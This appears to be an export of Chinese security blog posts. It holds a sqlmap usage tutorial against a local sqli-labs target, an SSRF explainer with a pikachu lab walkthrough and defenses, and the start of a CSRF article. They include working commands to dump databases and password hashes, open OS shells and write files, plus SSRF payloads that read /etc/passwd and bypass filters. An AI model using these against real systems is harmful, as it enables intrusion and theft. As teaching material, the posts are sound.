参数指定回显信息的复杂度，x范围为[0~6]，共有 7 个等级，默认为 1。</p><ul><li>0：只显示python错误以及严重的信息。</li><li>1：同时显示基本信息和警告信息。（默认）</li><li>2：同时显示debug信息。</li><li>3：同时显示注入的payload。</li><li>4：同时显示HTTP请求。</li><li>5：同时显示HTTP响应头。</li><li>6：同时显示HTTP响应页面。</li></ul><p>如果想看到 Sqlmap 发送的测试 payload 最好的等级就是3，例：</p><pre><code class="python">sqlmap.py -v 3 -u &quot;http://www.xxx.com/a.php?id=x&quot;</code></pre><h4 id="二、SQLMap安装"><a href="#二、SQLMap安装" class="headerlink" title="二、SQLMap安装"></a>二、SQLMap安装</h4><p>Sqlmap官网：<a href="http://sqlmap.org/">http://sqlmap.org/</a>，Sqlmap的安装需要Python环境，最新版可以运行在 Python 2.6, 2.7 和 3.x 版本的任何平台上。</p><p>下载完成后可以添加进环境变量，方便使用（不添加也可以用）<br><img src="https://img-blog.csdnimg.cn/2021021723551258.png"><br>当出现这个画面时工具即可正常运行了。</p><h4 id="三、SQLMap使用："><a href="#三、SQLMap使用：" class="headerlink" title="三、SQLMap使用："></a>三、SQLMap使用：</h4><h5 id="1、判断是否存在注入："><a href="#1、判断是否存在注入：" class="headerlink" title="1、判断是否存在注入："></a>1、判断是否存在注入：</h5><p>假设目标注入点是 <code>http://127.0.0.1/sqli-labs/Less-1/?id=1</code>，判断其是否存在注入的命令如下：</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1</code></pre><p>结果显示存在注入：<br><img src="https://img-blog.csdnimg.cn/20210218160857197.png">当注入点后面的参数大于等于两个时,需要加双引号，如下所示。</p><pre><code class="python">sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&amp;uid=2&quot;</code></pre><p>运行完判断是否存在注入的语句后，爆出一大段代码，这里有三处需要选择的地方：第一处的意思为检测到数据库可能是MySQL，是否需要跳过检测其他数据库；第二处的意思是在“level1、risk1”的情况下，是否使用MySQL对应的所有Payload进行检测；第三处的意思是参数<code>id</code>存在漏洞，是否要继续检测其他参数，一般默认按回车键即可。</p><p>可以在语句后面加参数：<code>--beach</code> 会选定默认的选项执行（如上）。</p><h5 id="2、判断文本中的请求是否存在注入："><a href="#2、判断文本中的请求是否存在注入：" class="headerlink" title="2、判断文本中的请求是否存在注入："></a>2、判断文本中的请求是否存在注入：</h5><p>从txt文件中加载HTTP请求，Sqlmap可以从一个文本文件中获取HTTP请求，这样就可以不设置其他参数(如cookie、POST数据等)，txt文件中的内容为Web数据包，如下：<br><img src="https://img-blog.csdnimg.cn/20210218165420683.png">判断是否存在注入的命令如下，运行后的结果如图所示，<code>-r</code>一般在存在cookie注入时使用。</p><pre><code class="python">sqlmap.py -r 1.txt</code></pre><p><img src="https://img-blog.csdnimg.cn/20210218165727726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><h5 id="3、查询当前用户下的所有数据库："><a href="#3、查询当前用户下的所有数据库：" class="headerlink" title="3、查询当前用户下的所有数据库："></a>3、查询当前用户下的所有数据库：</h5><p>该命令是确定网站存在注入后，用于查询当前用户下的所有数据库，如下所示。如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有数据库，如图所示：</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --dbs</code></pre><p><img src="https://img-blog.csdnimg.cn/20210218170129467.png"><br>从图中可以看到，查询出了10个数据库及所有数据库的库名。当继续注入时，<code>--dbs</code>缩写成<code>-D xxx</code>，其意思是在xxx数据库中继续查询其他数据。</p><h5 id="4、获取数据库中的表名："><a href="#4、获取数据库中的表名：" class="headerlink" title="4、获取数据库中的表名："></a>4、获取数据库中的表名：</h5><p>该命令的作用是查询完数据库后，查询指定数据库中所有的表名，如下所示。如果在该命令中不加入 <code>-D</code>参数来指定某一个具体的数据库，那么Sqlmap会列出数据库中所有库的表。</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -D security --tables</code></pre><p><img src="https://img-blog.csdnimg.cn/20210218171205301.png"><br>从图中可以看到 security 数据库中拥有的4个数据表。当继续注入时，<code>--tables</code>缩写成<code>-T</code>，意思是在某表中继续查询。</p><h5 id="5、获取表中的字段名："><a href="#5、获取表中的字段名：" class="headerlink" title="5、获取表中的字段名："></a>5、获取表中的字段名：</h5><p>该命令的作用是查询完表名后，查询该表中所有的字段名，如下所示。运行该命令的结果如图所示。</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -D security -T users --columns</code></pre><p><img src="https://img-blog.csdnimg.cn/20210218171747383.png"><br>从图中可以看到在 security 数据库中的users表中一共有3个字段。在后续的注入中，<code>--columns</code>缩写成<code>-C</code>。</p><h5 id="6、获取字段内容："><a href="#6、获取字段内容：" class="headerlink" title="6、获取字段内容："></a>6、获取字段内容：</h5><p>该命令是查询完字段名之后，获取该字段中具体的数据信息,如下所示。</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -D security -T users -C username,password --dump</code></pre><p>这里需要下载的数据是 security 数据库里 users 表中 username和password 的值，如图所示：<br><img src="https://img-blog.csdnimg.cn/20210218185035327.png"></p><h5 id="7、获取数据库的所有用户："><a href="#7、获取数据库的所有用户：" class="headerlink" title="7、获取数据库的所有用户："></a>7、获取数据库的所有用户：</h5><p>该命令的作用是列出数据库的所有用户，如下所示。在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --users</code></pre><p>可以看到，当前用户的账号是root，如图所示：<br><img src="https://img-blog.csdnimg.cn/20210218185546943.png"></p><h5 id="8、获取数据库用户的密码："><a href="#8、获取数据库用户的密码：" class="headerlink" title="8、获取数据库用户的密码："></a>8、获取数据库用户的密码：</h5><p>该命令的作用是列出数据库用户的密码，如下所示。如果当前用户有读取包含用户密码的权限，sqlmap会先列举出用户，然后列出Hash，并尝试破解。</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --passwords</code></pre><p><img src="https://img-blog.csdnimg.cn/20210218221345141.png"><br>从图中可以看到，密码使用MySQL5加密，可在网站中自行解密（自带的解密很慢）。<br><img src="https://img-blog.csdnimg.cn/20210218221815819.png"></p><h5 id="9、获取当前网站数据库的名称："><a href="#9、获取当前网站数据库的名称：" class="headerlink" title="9、获取当前网站数据库的名称："></a>9、获取当前网站数据库的名称：</h5><p>使用该命令可以列出当前网站使用的数据库，如下所示。</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --current-db</code></pre><p><img src="https://img-blog.csdnimg.cn/20210218222104689.png"><br>从图中可以看到数据库是security。</p><h5 id="10、获取当前网站数据库的用户名称："><a href="#10、获取当前网站数据库的用户名称：" class="headerlink" title="10、获取当前网站数据库的用户名称："></a>10、获取当前网站数据库的用户名称：</h5><p>使用该命令可以列出当前网站使用的数据库用户，如下所示。</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --current-user</code></pre><p><img src="https://img-blog.csdnimg.cn/20210218222615569.png"><br>从图中可以看到，用户是root。</p><h4 id="四、SQLMap进阶：参数讲解"><a href="#四、SQLMap进阶：参数讲解" class="headerlink" title="四、SQLMap进阶：参数讲解"></a>四、SQLMap进阶：参数讲解</h4><h5 id="1、-level-5：探测等级"><a href="#1、-level-5：探测等级" class="headerlink" title="1、--level 5：探测等级"></a>1、<code>--level 5</code>：探测等级</h5><p>参数<code>--level 5</code>指需要执行的测试等级，一共有5个等级（1~5），不加 level 默认是1。5级包含的 Payload 最多，会自动破解出 cookie、XFF等头部注入。当然，level 5的运行速度也比较慢。</p><p>这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie 在 level 为2时就会测试，HTTP User-Agent/Referer 头在 level 为3时就会测试。总之，在不确定哪个 payload 或参数为注入点时，为了保证全面性，建议使用高的 level 值。</p><h5 id="2、-is-dba：当前用户是否为管理权限"><a href="#2、-is-dba：当前用户是否为管理权限" class="headerlink" title="2、--is-dba：当前用户是否为管理权限"></a>2、<code>--is-dba</code>：当前用户是否为管理权限</h5><p>该命令用于查看当前账户是否为数据库管理员账户，如下所示：</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --is-dba</code></pre><p><img src="https://img-blog.csdnimg.cn/2021021823304973.png"></p><h5 id="3、-roles：列出数据库管理员角色"><a href="#3、-roles：列出数据库管理员角色" class="headerlink" title="3、--roles：列出数据库管理员角色"></a>3、<code>--roles</code>：列出数据库管理员角色</h5><p>该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用<code>-U</code>参数指定想看哪个用户的角色，如图所示：<br><img src="https://img-blog.csdnimg.cn/20210219000331947.png"></p><h5 id="4、-referer：HTTP-referer头"><a href="#4、-referer：HTTP-referer头" class="headerlink" title="4、--referer：HTTP referer头"></a>4、<code>--referer</code>：HTTP referer头</h5><p>Sqlmap 可以在请求中伪造 HTTP 中的 referer，当<code>--level</code>参数设定为3或3以上时，会尝试对referer注入。可以使用referer命令来欺骗，例：</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --referer http://www.baidu.com</code></pre><h5 id="5、-sql-shell：运行自定义SQL语句"><a href="#5、-sql-shell：运行自定义SQL语句" class="headerlink" title="5、--sql-shell：运行自定义SQL语句"></a>5、<code>--sql-shell</code>：运行自定义SQL语句</h5><p>该命令用于执行指定的SQL语句，如下所示，假设执行<code>select * from users limit 0,1</code>语句，如下所示：</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --sql-shell</code></pre><p><img src="https://img-blog.csdnimg.cn/20210219001121933.png"></p><h5 id="6、-os-cmd，-os-shell：运行任意操作系统命令"><a href="#6、-os-cmd，-os-shell：运行任意操作系统命令" class="headerlink" title="6、--os-cmd，--os-shell：运行任意操作系统命令"></a>6、<code>--os-cmd</code>，<code>--os-shell</code>：运行任意操作系统命令</h5><p>在当前用户有权限使用特定的函数的前提下，如果数据库为MySQL、PostgreSQL，Sqlmap会上传一个二进制库，包含用户自定义的函数<code>sys_exec ()</code> 和<code>sys_eval ()</code>，那么创建的这两个函数就可以执行系统命令。</p><p>如果数据库是微软 SQL Server时，Sqlmap通过存储过程 xp_cmdshell 来执行任意命令，如果 xp_cmdshell 被禁用(SQL Server 2005及以上版本默认被禁用)，则Sqlmap会重新启用它；如果不存在，会自动创建。</p><p>用<code>--os-shell</code>参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(如PHP或ASP+Mysql)，仍然可以使用 INTO OUTFILE写进可写目录，创建一个Web后门。</p><p>Sqlmap支持ASP、ASP.NET、JSP和PHP四种语言（要想执行该参数，需要有数据库管理员权限，也就是<code>--is-dba</code>的值要为True)。</p><p>1.执行系统命令：</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os-cmd=ipconfig</code></pre><p>执行后根据提示选择网站语言，然后回车，指定目标站点根目录，然后继续回车即可完整执行命令。</p><p>2.执行shell：</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os-shell</code></pre><p>执行后根据提示选择网站语言，然后回车，指定目标站点根目录后回车，输入命令即可执行。</p><p>执行命令后会在网站根目录上传两个文件：tmpbxbxz.php、tmpuoiuz.php(此文件为上传页面)</p><h5 id="7、-file-read：从数据库服务器中读取文件"><a href="#7、-file-read：从数据库服务器中读取文件" class="headerlink" title="7、--file-read：从数据库服务器中读取文件"></a>7、<code>--file-read</code>：从数据库服务器中读取文件</h5><p>该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或MicrosoftSQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-read &quot;C:/11.txt&quot;</code></pre><p><img src="https://img-blog.csdnimg.cn/589fd4ad3a3e4c4495b0aa805a95584f.png"><br>执行完会把文件保存到本地目录下<br><img src="https://img-blog.csdnimg.cn/8ff51affc6f74c309dafcbfdbe8943dc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h5 id="8、-file-write-file-dest：上传文件到数据库服务器中"><a href="#8、-file-write-file-dest：上传文件到数据库服务器中" class="headerlink" title="8、--file-write --file-dest：上传文件到数据库服务器中"></a>8、<code>--file-write --file-dest</code>：上传文件到数据库服务器中</h5><p>该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-write &quot;C:/1.txt&quot; --file-dest &quot;C:/windows/Temp/1.php&quot;</code></pre><p>执行结束即可把本地的1.txt 文件上传到目标服务器下<br><img src="https://img-blog.csdnimg.cn/7f133d2c16514d8396026789f8e9aa2f.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞原理解析</title>
      <link href="2021/02/03/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
      <url>2021/02/03/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h4><h5 id="1、SSRF漏洞简介："><a href="#1、SSRF漏洞简介：" class="headerlink" title="1、SSRF漏洞简介："></a>1、SSRF漏洞简介：</h5><p>SSRF全称：Server-Side Request Forgery，即 服务器端请求伪造，是一个由攻击者构造请求 在目标服务端执行的一个安全漏洞。攻击者可以利用该漏洞使服务器端向攻击者构造的任意域发出请求，目标通常是从外网无法访问的内部系统。简单来说就是利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网进行攻击。<br><img src="https://img-blog.csdnimg.cn/20210201123308820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="2、主要攻击方式："><a href="#2、主要攻击方式：" class="headerlink" title="2、主要攻击方式："></a>2、主要攻击方式：</h5><p>当攻击者想要访问服务器B上的服务，但是由于存在防火墙或者服务器B是属于内网主机等原因导致攻击者无法直接访问。如果服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，达到攻击内网的目的。<br><img src="https://img-blog.csdnimg.cn/20210201154507368.png" alt="在这里插入图片描述"><br>示例：</p><p>漏洞场景：某网站有一个在线加载功能可以把指定的远程文章加载到本地，链接如下：</p><pre><code class="css">http://www.xxx.com/article.php?url=https://blog.csdn.net/qq_43531669/article/details/112498646</code></pre><p>假如系统没有对url参数进行任何的检查，就可以构造其他的请求，例如：</p><pre><code class="css">http://www.xxx.com/article.php?url=http://127.0.0.1:22http://www.xxx.com/article.php?url=file:///etc/passwdhttp://www.xxx.com/article.php?url=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2)http://www.xxx.com/article.php?url=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求)...</code></pre><h5 id="3、漏洞形成原理："><a href="#3、漏洞形成原理：" class="headerlink" title="3、漏洞形成原理："></a>3、漏洞形成原理：</h5><p>很多网站提供了从其他的服务器上获取数据的功能。通过指定的URL，网站可以从其他地方获取图片、下载文件、读取文件内容等。SSRF的实质就是利用存在缺陷的Web站点作为代理攻击远程和本地的服务器。</p><p>SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器获取数据的功能但没有对目标地址做过滤与限制。攻击者可以利用改漏洞获取内部系统的一些信息（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网系统）。</p><h5 id="4、漏洞的危害："><a href="#4、漏洞的危害：" class="headerlink" title="4、漏洞的危害："></a>4、漏洞的危害：</h5><ol><li><p>对外网、服务器所在内网、本地进行端口扫描</p></li><li><p>向内部任意主机的任意端口发送payload来攻击内网服务</p></li><li><p> DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</p></li><li><p>攻击内网的web应用，如直接SQL注入、XSS攻击等</p></li><li><p>利用file、gopher、dict协议读取本地文件、执行命令等</p></li><li><p>可以无视网站CDN</p></li></ol><p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p><h4 id="0x02-漏洞检测"><a href="#0x02-漏洞检测" class="headerlink" title="0x02 漏洞检测"></a>0x02 漏洞检测</h4><h5 id="1、漏洞验证"><a href="#1、漏洞验证" class="headerlink" title="1、漏洞验证:"></a>1、漏洞验证:</h5><p>因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞。</p><p>在页面源码中查找访问的资源地址，如果该资源地址类型为<code>http://www.xxx.com/a.php?image=地址</code>就可能存在SSRF漏洞。</p><h5 id="2、漏洞的可能出现点："><a href="#2、漏洞的可能出现点：" class="headerlink" title="2、漏洞的可能出现点："></a>2、漏洞的可能出现点：</h5><p>（1） 分享功能：通过URL地址分享文章等，例如如下地址：</p><pre><code class="css">http://share.xxx.com/index.php?url=http://www.xxx.com</code></pre><p>通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</p><p>（2）图片加载/下载：通过URL地址加载或下载图片：</p><pre><code class="css">http://image.xxx.com/image.php?image=http://www.xxx.com</code></pre><p>图片加载存在于很多的编辑器中，编辑器上传图片处加载设定好的远程服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。</p><p>（3）图片/文章收藏功能：</p><pre><code class="css">http://title.xxx.com/title?title=http://title.xxx.com/xxx</code></pre><p>例如 title参数是文章的标题地址，代表了一个文章的地址链接，如果收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p><p>（4）转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</p><p>（5）在线翻译：给网址翻译对应网页的内容。</p><p>（6）邮件系统：比如接收邮件服务器地址。</p><p>（7）利用参数中的关键字查找：</p><p>关键字：</p><pre><code class="css">share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain...</code></pre><p>总的来说，需要从远程服务器请求资源的网站都有可能存在SSRF漏洞。</p><h4 id="0x03-绕过方法："><a href="#0x03-绕过方法：" class="headerlink" title="0x03 绕过方法："></a>0x03 绕过方法：</h4><p>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</p><h5 id="1、绕过限制为某种域名："><a href="#1、绕过限制为某种域名：" class="headerlink" title="1、绕过限制为某种域名："></a>1、绕过限制为某种域名：</h5><p>（1）利用@，当网站限制只能访问 <code>http://www.xxx.com</code>类型的域名时，可以采用http基本身份认证的方式绕过，如：<a href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com</a></p><p>在对@解析域名中，不同的处理函数存在处理差异，例如：</p><pre><code class="css">http://www.aaa.com@www.bbb.com@www.ccc.com</code></pre><p>在PHP的parse_url中会识别 <a href="http://www.ccc.com,而libcurl则识别为/">www.ccc.com，而libcurl则识别为</a> <a href="http://www.bbb.com./">www.bbb.com。</a></p><h5 id="2、绕过限制请求IP不为内网地址："><a href="#2、绕过限制请求IP不为内网地址：" class="headerlink" title="2、绕过限制请求IP不为内网地址："></a>2、绕过限制请求IP不为内网地址：</h5><p>（1）采用短网址绕过</p><p>（2）利用特殊域名，xip.io可以指向任意域名（原理是DNS解析），即 127.0.0.1.xip.io，可以解析为127.0.0.1</p><p>（3）采用进制转换，127.0.0.1 八进制：<code>0177.0.0.1</code>；十六进制：<code>0x7f.0.0.1</code>；十进制：<code>2130706433</code></p><p>（4）利用<code>[::]</code>，<code>http://[::]:80/</code> 会解析为 <code>http://127.0.0.1</code></p><p>（5）添加端口号，<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p><p>（6）利用句号，<code>127。0。0。1</code>  会解析为 127.0.0.1</p><p>（7）采用302跳转</p><h5 id="3、限制请求只为http协议："><a href="#3、限制请求只为http协议：" class="headerlink" title="3、限制请求只为http协议："></a>3、限制请求只为http协议：</h5><p>（1）采用302跳转</p><p>（2）采用短地址</p><h4 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h4><h5 id="1、产生漏洞的函数："><a href="#1、产生漏洞的函数：" class="headerlink" title="1、产生漏洞的函数："></a>1、产生漏洞的函数：</h5><p>根据后台使用的函数的不同，相应的影响和利用方法也不一样，PHP中下面函数的使用不当会导致SSRF:</p><pre><code class="php">file_get_contents()fsockopen()curl_exec()       </code></pre><p> <strong>file_get_contents()</strong></p><p>这个函数的作用是将整个文件读入一个字符串中，并且此函数是用于把文件的内容读入到一个字符串中的首选方法。</p><p>比如：下面的代码执行结果是输出test.txt文件里面的字符串。</p><pre><code class="php">&lt;?phpecho file_get_contents(“test.txt”);?&gt;</code></pre><p><strong>fsockopen()</strong></p><p>使用fsockopen函数实现获取用户制定url的数据（文件或者html）。</p><p><strong>curl_exec()</strong></p><p>该函数可以执行给定的curl会话。</p><p>其中curl 支持的协议有：<br><img src="https://img-blog.csdnimg.cn/20210202220018511.png" alt="在这里插入图片描述"></p><h5 id="2、漏洞靶场："><a href="#2、漏洞靶场：" class="headerlink" title="2、漏洞靶场："></a>2、漏洞靶场：</h5><p>这里使用pikachu靶场的ssrf模块进行演示。</p><p>**2.1、SSRF(curl)**：</p><p>首先来看使用<code>curl_exec()</code>函数的ssrf靶场，点击页面链接会返回一首诗，观察发现它传递了一个url请求给后台<br><img src="https://img-blog.csdnimg.cn/20210202162640294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看后端代码，可以看到它是用get获取了前端的url请求，curl_exec函数执行请求，最终又将请求结果返回到前端。<br><img src="https://img-blog.csdnimg.cn/20210202215202839.png" alt="在这里插入图片描述"></p><pre><code class="php">curl_init //初始cURL会话curl_exec //执行cURL会话</code></pre><p>将上传的url修改为<a href="http://www.badiu.com,可以看到页面显示出了百度的数据/">http://www.badiu.com，可以看到页面显示出了百度的数据</a><br><img src="https://img-blog.csdnimg.cn/20210202221117223.png" alt="在这里插入图片描述"><br>我们可以把url中的内容改成内网的其他服务器上地址和端口，探测内网信息，比如端口开放情况，例如，下图探测出内网主机 192.168.50.130 开放了22端口：<br><img src="https://img-blog.csdnimg.cn/2021020222403459.png" alt="在这里插入图片描述"><br>可以配合脚本或者Burp进行更高效的端口探测，例：</p><p>打开Burp，抓包发到Intruder，设置Payload<br><img src="https://img-blog.csdnimg.cn/20210203182416622.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210203182603788.png" alt="在这里插入图片描述"></p><p>可以看到，检测到了内网主机的80端口是开放的<br><img src="https://img-blog.csdnimg.cn/20210203182341904.png" alt="在这里插入图片描述"><br>我们也可以通过SSRF漏洞读取内网服务器的文件，例如将url修改为 </p><pre><code class="css">http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/windows/system.ini</code></pre><p><img src="https://img-blog.csdnimg.cn/20210202223736190.png" alt="在这里插入图片描述"><br>**2.2、SSRF(file_get_content)**：</p><p>同样点击页面标签，发现是使用file协议读取文件<br><img src="https://img-blog.csdnimg.cn/20210202231242414.png" alt="在这里插入图片描述"><br>查看后端代码<br><img src="https://img-blog.csdnimg.cn/20210202233451702.png" alt="在这里插入图片描述"><br>与上面大致相同，不同之处是它这里使用<code>file_get_contents</code>函数进行文件的读取执行，而<code>file_get_contents</code>函数可以对本地文件进行读取，也可以对远程文件进行读取，例如：</p><pre><code class="css">http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=http://192.168.50.130/index.htmlhttp://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///c:/windows/system.ini</code></pre><p>或者使用 filter 获得页面源码（直接访问只会被当做php文件被执行 <a href="https://blog.csdn.net/qq_29419013/article/details/81201494">详细解释</a>）</p><pre><code class="css">http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=test.php</code></pre><p><img src="https://img-blog.csdnimg.cn/20210202235813210.png" alt="在这里插入图片描述"><br>base64解密后得到源码：<br><img src="https://img-blog.csdnimg.cn/20210202235915498.png" alt="在这里插入图片描述"></p><h4 id="0x05-如何防御SSRF"><a href="#0x05-如何防御SSRF" class="headerlink" title="0x05 如何防御SSRF"></a>0x05 如何防御SSRF</h4><p>1、禁止跳转</p><p>2、禁用除http和https外的协议，如：<code>file://</code>、<code>gopher://</code>、<code>dict://</code>等。</p><p>3、限制请求的端口为http常用的端口，如 80、443、8080。</p><p>4、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。</p><p>5、对请求地址设置白名单或者限制内网IP，以防止对内网进行攻击。</p><hr><p>参考文章：<br><a href="https://cloud.tencent.com/developer/article/1561355">https://cloud.tencent.com/developer/article/1561355</a><br><a href="https://www.cnblogs.com/DxyG/p/13742430.html">https://www.cnblogs.com/DxyG/p/13742430.html</a><br><a href="https://www.cnblogs.com/dogecheng/p/11652022.html#2605005798">https://www.cnblogs.com/dogecheng/p/11652022.html#2605005798</a><br><a href="https://cloud.tencent.com/developer/article/1587012">https://cloud.tencent.com/developer/article/1587012</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从CSRF原理到CMS漏洞利用</title>
      <link href="2021/02/02/%E4%BB%8ECSRF%E5%8E%9F%E7%90%86%E5%88%B0CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>2021/02/02/%E4%BB%8ECSRF%E5%8E%9F%E7%90%86%E5%88%B0CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="0x01-基础知识："><a href="#0x01-基础知识：" class="headerlink" title="0x01    基础知识："></a>0x01    基础知识：</h4><h5 id="1、CSRF漏洞简介："><a href="#1、CSRF漏洞简介：" class="headerlink" title="1、CSRF漏洞简介："></a>1、CSRF漏洞简介：</h5><p>CSRF全称:Cross-site request forgery，即，跨站请求伪造，也被称为“One Click Attack”或“Session Riding”，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。举个生活中的例子：就是某个人点了个奇怪的链接，自己什么也没输，但自己的qq号或其他的号就被盗了。即该攻击可以在受害者不知情的情况下以受害者名义伪造请求，执行恶意操作，具有很大的危害性。</p><h5 id="2、与XSS的区别："><a href="#2、与XSS的区别：" class="headerlink" title="2、与XSS的区别："></a>2、与XSS的区别：</h5><p>CSRF听起来很像跨站脚本攻击（XSS），但它与XSS有很大区别，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。两者的攻击流程如下图：</p><p><img src="https://img-blog.csdnimg.cn/20210126173608228.png" alt="在这里插入图片描述"></p><h5 id="3、攻击的细节："><a href="#3、攻击的细节：" class="headerlink" title="3、攻击的细节："></a>3、攻击的细节：</h5><p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个用户曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了Web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><p>CSRF攻击流程如下：<br><img src="https://img-blog.csdnimg.cn/20210125000431844.png"><br><strong>举个例子</strong>：</p><p>场景需求：坏人小黑想要修改小明在购物网站<a href="http://www.xx.com上填写的会员地址./">www.xx.com上填写的会员地址。</a></p><p>小黑想要修改小明的信息，他需要拥有：1、登录权限 2、修改个人信息的请求。</p><p>但是小明又不会把自己的账号密码告诉小黑，那小黑怎么办？于是小黑自己跑到<a 